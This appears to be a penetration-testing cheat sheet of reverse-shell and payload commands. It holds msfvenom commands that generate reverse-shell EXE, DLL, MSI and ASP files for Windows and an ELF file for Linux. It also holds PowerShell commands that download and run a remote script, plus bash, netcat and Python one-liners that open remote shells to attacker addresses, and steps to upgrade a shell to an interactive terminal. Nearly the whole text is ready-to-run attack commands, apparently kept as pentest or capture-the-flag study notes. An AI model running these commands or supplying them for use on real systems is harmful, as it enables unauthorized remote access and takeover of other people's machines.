# Shells

## References
[Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)<br/>
[Native Shells](https://github.com/mthbernardes/rsg)<br/>
[GTFO Bins](https://gtfobins.github.io/)<br/>


## Windows

### msfvenom

_EXE_
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=443 -f exe -o reverse.exe
```
_DLL_
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=443 -f dll -o hijackme.dll
```
_MSI_
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=443 -f msi -o reverse.msi
```
_ASP/ASPX_
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=443 -f asp > reverse.asp
```
_Powershell Stager_
```sh
msfvenom --platform Windows -p windows/exec CMD="powershell \"IEX (New-Object System.Net.WebClient).downloadString('http://10.10.14.1/shell.ps1')\"" -f python
```

### powershell

_Invoke-TcpShell_
```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/shell.ps1')
```
---
## Linux

### msfvenom
_RAW/ELF_
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf > shell.elf
```
### bash
```
bash -i >& /dev/tcp/10.10.14.1/443 0>&1
```
### nc
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 443 >/tmp/f
nc 10.10.14.1 443 -e /bin/sh
```

## python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## python shell upgrade
```
python -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
```
_Make interactive_ (tab completion, )
- CTRL+Z (bg)
- stty raw -echo
- fg

## Appendix

_List All msfvenom payloads_
```
msvenom --list payloads
```
